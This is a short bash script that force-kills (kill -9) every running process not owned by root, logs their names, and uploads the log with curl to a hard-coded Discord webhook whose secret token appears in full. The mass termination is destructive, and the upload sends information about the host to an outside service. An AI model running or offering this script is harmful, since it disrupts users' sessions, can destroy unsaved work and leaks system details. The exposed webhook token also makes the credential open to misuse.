#!/bin/bash

log_file="terminated_processes.txt"
echo "Terminating all non-system applications..." > "$log_file"

# Get the list of all running processes excluding system processes
for pid in $(ps -e -o pid=); do
    # Get the process name and its owner
    process_info=$(ps -p $pid -o comm=,uid=)
    process_name=$(echo $process_info | cut -d' ' -f1)
    uid=$(echo $process_info | cut -d' ' -f2)

    # Check if the process is not a system process (UID 0)
    if [[ $uid -ne 0 ]]; then
        echo "Terminating process: $process_name" >> "$log_file"
        kill -9 $pid 2>/dev/null
    fi
done

# Send the log file to Discord webhook
curl -F "file=@$log_file" "https://discord.com/api/webhooks/1269102396621983889/wcS8DDGkbmQxPkq0i2VAs3GTgUV3SL06wFUVquMWB8l6_y4ZjqpCfIm93BYZxyG6FtrN"

echo "All non-system applications have been terminated."
